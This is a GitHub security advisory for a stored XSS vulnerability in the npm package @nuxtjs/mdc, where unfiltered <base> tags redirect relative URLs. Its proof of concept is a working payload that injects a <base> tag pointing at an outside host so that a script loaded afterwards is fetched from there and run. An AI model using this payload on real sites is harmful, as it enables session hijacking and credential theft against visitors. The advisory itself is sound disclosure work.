# [H] Nuxt MDC has an XSS vulnerability in markdown rendering that bypasses HTML filtering

## Summary
Severity: High
Advisory: GHSA-cj6r-rrr9-fg82
CVE: CVE-2025-54075
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2025-07-20
Source: https://github.com/advisories/GHSA-cj6r-rrr9-fg82
Type: github-advisory

## Affected
- npm: `@nuxtjs/mdc` — affected >=0 <0.17.2

## Details
### Summary
A **remote script-inclusion / stored XSS** vulnerability in **@nuxtjs/mdc** lets a Markdown author inject a `<base href="https://attacker.tld">` element.  
The `<base>` tag rewrites how all subsequent relative URLs are resolved, so an attacker can make the page load scripts, styles, or images from an external, attacker-controlled origin and execute arbitrary JavaScript in the site’s context.

### Details
- **Affected file** : `src/runtime/parser/utils/props.ts`  
- **Core logic**  : `validateProp()` inspects  
  * attributes that start with `on` → blocked  
  * `href` or `src` → filtered by `isAnchorLinkAllowed()`  
  Every other attribute and every **tag** (including `<base>`) is allowed unchanged, so the malicious `href` on `<base>` is never validated.


```
export const validateProp = (attribute: string, value: string) => {
  if (attribute.startsWith('on')) return false
  if (attribute === 'href' || attribute === 'src') {
    return isAnchorLinkAllowed(value)
  }
  return true               // ← “href” on <base> not checked
}
```

As soon as `<base href="https://vozec.fr">` is parsed, any later relative path—`/script.js`, `../img.png`, etc.—is fetched from the attacker’s domain.

### Proof of Concept
Place the following in any Markdown handled by Nuxt MDC:


```
<base href="https://vozec.fr">
<script src="/xss.js"></script>
```

1. Start the Nuxt app (`npm run dev`).  
2. Visit the page.  
3. The browser requests `https://vozec.fr/xss.js`, and whatever JavaScript it returns runs under the vulnerable site’s origin (unless CSP blocks it).

### Impact
- **Type**: Stored XSS via remote script inclusion  
- **Affected apps**: Any Nuxt project using **@nuxtjs/mdc** to render user-controlled Markdown (blogs, CMSs, docs, comments…).  
- **Consequences**: Full takeover of visitor sessions, credential theft, defacement, phishing, CSRF, or any action executable via injected scripts.

### Recommendations
1. **Disallow or sanitize `<base>` tags** in the renderer. The safest fix is to strip them entirely.  
2. Alternatively, restrict `href` on `<base>` to same-origin URLs and refuse protocols like `http:`, `https:`, `data:`, etc. that do not match the current site origin.  
3. Publish a patched release and document the security fix.  
4. Until patched, disable raw HTML in Markdown or use an external sanitizer (e.g., DOMPurify) with `FORBID_TAGS: ['base']`.

## References
- https://github.com/nuxt-modules/mdc/security/advisories/GHSA-cj6r-rrr9-fg82
- https://nvd.nist.gov/vuln/detail/CVE-2025-54075
- https://github.com/nuxt-modules/mdc/commit/3657a5bf2326a73cd3d906f57149146a412b962a
- https://github.com/nuxt-modules/mdc
